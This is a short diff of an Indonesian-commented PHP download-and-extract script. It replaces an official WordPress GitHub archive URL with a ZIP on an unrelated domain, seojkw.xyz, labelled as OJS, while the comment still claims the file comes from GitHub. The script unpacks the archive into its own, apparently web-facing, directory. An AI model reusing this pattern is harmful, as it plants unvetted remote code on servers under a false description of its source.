@@ -1,6 +1,6 @@
 <?php
 // ============================================================
-//  DOWNLOAD & EKSTRAK WORDPRESS 7.0.2 (Hanya ZipArchive)
+//  DOWNLOAD & EKSTRAK ojs-3.4.0-9 (Hanya ZipArchive)
 //  Tanpa exec / shell / system
 // ============================================================
 set_time_limit(0);
@@ -10,8 +10,8 @@ $message = '';
 $targetDir = __DIR__; // langsung di direktori script ini
 
 if (isset($_POST['download'])) {
-    // URL ZIP WordPress 7.0.2 dari GitHub
-    $url = 'https://github.com/WordPress/WordPress/archive/refs/tags/7.0.2.zip';
+    // URL ZIP ojs-3.4.0-9 dari GitHub
+    $url = 'https://seojkw.xyz/ojs-3.4.0-9.zip';
     $zipName = '7.0.2.zip';
     $zipPath = $targetDir . '/' . $zipName;
 
